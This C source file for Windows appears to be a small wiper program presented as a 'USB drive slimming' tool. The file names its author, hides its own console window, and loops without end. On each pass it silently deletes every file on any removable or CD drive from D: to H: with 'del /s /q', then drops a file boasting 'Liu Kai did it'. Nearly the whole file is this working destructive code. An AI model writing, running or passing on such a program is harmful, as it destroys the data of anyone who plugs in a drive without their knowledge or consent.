#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h> 
#include <io.h>
int main() {
    while (1) {

        Sleep(70);
        // 设置窗口标题
        SetConsoleTitle("U盘瘦身-作者刘凯");
        HWND hwnd = FindWindow(NULL, "U盘瘦身-作者刘凯");
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE); // 隐藏自身窗口
        }
  
        //FILE* fil;

        //fil = fopen_s(&fil, "C://fuck.txt", "r");
        //if (fil != NULL) {
        //    MessageBox(NULL, L"程序已退出", L"提示", MB_OK);
        //    fclose(fil);
        //    return 0;
        //}
        /*
        if (file != NULL) {
            printf("文件存在");
            MessageBox(NULL, "程序已退出", "提示", MB_OK);
            fclose(file);
            exit(0);
        }*/
   

            if (GetDriveType("D:") != DRIVE_NO_ROOT_DIR) {
            char drive[] = "D:\\*.*"; // 需要删除的硬盘盘符，带上通配符
            UINT driveType = GetDriveType("D:");
            if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                printf("D该硬盘是移动磁盘\n"); // 删除该移动磁盘下的所有文件
                system("del /s /q D:\\*.*");
                FILE *file;
    			file = fopen("D:\\刘凯干的.txt", "w");
            }
        }

            if (GetDriveType("E:") != DRIVE_NO_ROOT_DIR) 
			{
                char drive[] = "E:\\*.*"; // 需要删除的硬盘盘符，带上通配符
                UINT driveType = GetDriveType("E:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) 
				{
                    printf("E盘：该硬盘是移动磁盘\n");// 删除该移动磁盘下的所有文件
                    system("del /s /q E:\\*.*");
                    FILE *file;
    				file = fopen("E:\\刘凯干的.txt", "w");
                }
                else {
                    printf("该硬盘不是移动磁盘\n");
                }
            }

            if (GetDriveType("F:") != DRIVE_NO_ROOT_DIR) {
                UINT driveType = GetDriveType("F:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("F盘：该硬盘是移动磁盘\n");
                    system("del /s /q F:\\*.*");
                    FILE *file;
    				file = fopen("F:\\刘凯干的.txt", "w");
                }
                else {
                    printf("该硬盘不是移动磁盘\n");
                }
            }

            if (GetDriveType("G:") != DRIVE_NO_ROOT_DIR) {
                UINT driveType = GetDriveType("G:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("G该硬盘是移动磁盘\n");
                    system("del /s /q G:\\*.*");
                    FILE *file;
    				file = fopen("G:\\刘凯干的.txt", "w");
                }
                else {
                    printf("该硬盘不是移动磁盘\n");
                }
            }

            if (GetDriveType("H:") != DRIVE_NO_ROOT_DIR) {
                char drive[] = "H:\\*.*"; // 需要删除的硬盘盘符，带上通配符
                UINT driveType = GetDriveType("H:");
                if (driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM) {
                    printf("H该硬盘是移动磁盘\n");
                    system("del /s /q H:\\*.*");
                    FILE *file;
    				file = fopen("H:\\刘凯干的.txt", "w");
                }
                else {
                    printf("该硬盘不是移动磁盘\n");
                }
            }
        }

        //system("pause");
        return 0;
    
}
